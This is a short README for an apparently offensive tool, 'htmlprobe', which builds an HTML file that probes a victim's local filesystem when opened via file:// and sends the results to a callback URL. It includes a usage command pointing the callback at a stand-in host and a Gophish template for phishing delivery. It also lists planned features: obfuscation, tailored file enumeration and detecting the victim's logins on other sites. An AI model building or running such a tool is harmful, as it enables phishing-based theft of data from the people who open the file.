# Description
Generates a .HTML file that upon opening via. the file:// protocol (download and open) probes
the hosts filesystem to exfiltrate information that can be used later on.

The .HTML will send a POST request to the callback URL with form encoded data.

# Usage
 
 Simple usage - replace callback with were you want the data sent.
`htmlprobe -callback "https://example.com/callback"`

Gophish usage
`htmlprobe -callback "{{.URL}}"`

# Ideas
 - Based on the path of the opened file, which most oftenly would be in the Downloads folder,
it should be possible to know (atleast on windows) which language i used, and use that 
prefix for the file enumeration.
 - Pull in dictionaries after loading the script, this could depend on initial analysis (OS, language etc)
 - After submission callback, a method that is to be called after the probe callback has happend.
 - More obfuscation techniques. 
 - It is possible to identify some login on other sites via. loading images that have different urls depending on state, see social media leaks.